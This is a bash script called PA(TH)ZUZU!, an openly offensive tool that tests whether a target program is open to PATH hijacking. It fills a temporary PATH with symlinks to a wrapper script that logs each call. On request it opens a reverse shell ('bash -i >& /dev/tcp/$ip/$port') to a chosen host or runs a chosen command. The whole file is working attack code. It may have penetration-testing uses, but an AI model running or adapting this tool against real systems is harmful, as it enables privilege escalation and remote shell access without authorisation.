#!/usr/bin/env bash
#+-----------+
#|PA(TH)ZUZU!|
#+-v1.5------+------+
#|Brought to you by:|
#| Shotokan@aitch.me|
#+-PGP-AHEAD--------+----------+
#|https://keybase.io/ShotokanZH|
#+-$BEGIN----------------------+

ip="";
port="";
exe="";

OPTIND=1;
while getopts 'r:e:t:' opt;
do
	case "$opt" in
		r)
			ip="$(echo "$OPTARG" | cut -d ':' -f 1 | grep -aoP '^[a-zA-Z0-9._-]+$')";
			port="$(echo "$OPTARG" | cut -d ':' -f 2 | grep -aoP '^\d+$')";
			if [ "$ip" == "" ] || [ "$port" == "" ];
			then
				echo "Invalid -r" >&2;
				ip="";
				port="";
			fi;
			;;
		e)
			exe="$OPTARG";
			;;
		t)
			timeout="$(echo "$OPTARG" | grep -aoP '^\d+$')";
			if [ "$timeout" == "" ];
			then
				echo "Invalid -t";
			fi;
			;;
	esac;
done;
shift "$((OPTIND-1))";

tor="$(which "$1")";
log="$(basename "$0").log"

if [ "$tor" = "" ];
then
	echo "Usage: $0 [-r address:port] [-e command] [-t seconds] /path/to/command [args]";
	echo -e "\t-r address:port\tStarts reverse shell to address:port";
	echo -e "\t-e command\tRuns command if target is vulnerable";
	echo -e "\t-t seconds\tKills target (SIGTERM) after \$seconds seconds";
	exit 1;
fi;

trap '' 2;

rm -rf "$log" 2>/dev/null;

echo "$(dirname "$tor")" | grep "^\." >/dev/null;
if [ $? -eq 0 ];
then
	tor="$PWD/$tor";
fi;

startd="$PWD";
tmpd=$(mktemp -d);

tmpf=$(mktemp);
echo "#!$(which bash)" > $tmpf;
echo "PATH=\"${PATH}\"" >> $tmpf;
echo "echo \"\$(whoami) RUN: \$(basename \"\$0\") \$@\" >> $startd/$log" >> $tmpf;
if [ "$ip" != "" ] && [ "$port" != "" ];
then
	echo "if mkdir /dev/shm/pathzuzu_rev_lock 2>/dev/null;" >> $tmpf;
	echo "then" >> $tmpf;
	echo -e "\tchown $(whoami):$(whoami) /dev/shm/pathzuzu_rev_lock;" >> $tmpf;
	echo -e "\tbash -i >& /dev/tcp/$ip/$port 0>&1 &" >> $tmpf;
	echo "fi;" >> $tmpf;
fi;
if [ "$exe" != "" ];
then
	echo "if mkdir /dev/shm/pathzuzu_exe_lock 2>/dev/null;" >> $tmpf;
	echo "then" >> $tmpf;
	echo -e "\tchown $(whoami):$(whoami) /dev/shm/pathzuzu_exe_lock;" >> $tmpf;
	echo -e "\t$exe &" >> $tmpf;
	echo "fi;" >> $tmpf;
fi;
echo "\$(basename \"\$0\") \$@" >> $tmpf;

chmod +x "$tmpf";

OIFS=$IFS;
IFS=':';
echo "Lemme do evil things:";
for p in $PATH;
do
	IFS=$OIFS;
	list=$(ls "$p" 2>/dev/null);
	if [ $? -eq 0 ];
	then
		echo -e "\tOK ($p)";
		for soft in $list;
		do
			ln -s "$tmpf" "$tmpd/$soft" 2>/dev/null;
		done;
	else
		echo -e "\tNOPE ($p)";
	fi;
	IFS=':';
done;
IFS=$OIFS;

shift;

rm -rf "/dev/shm/pathzuzu_rev_lock" 2>/dev/null;
rm -rf "/dev/shm/pathzuzu_exe_lock" 2>/dev/null;

echo "Running: $tor $@";
echo "";

if [ "$timeout" ==  "" ];
then
	PATH="$tmpd" "$tor" $@;
else
	t_exe="$(which timeout)";
	PATH="$tmpd" "$t_exe" $timeout "$tor" $@;
fi;

rm -rf "$tmpd";
rm -rf "$tmpf";
rm -rf "/dev/shm/pathzuzu_rev_lock" 2>/dev/null;
rm -rf "/dev/shm/pathzuzu_exe_lock" 2>/dev/null;

echo "";
echo "";

trap 2;

if [ -f "$log" ];
then
	echo "Done! printing $log:";
	echo "";
	cat "$log";
	exit 0;
else
	echo "Done, but nothing found..";
	exit 1;
fi;
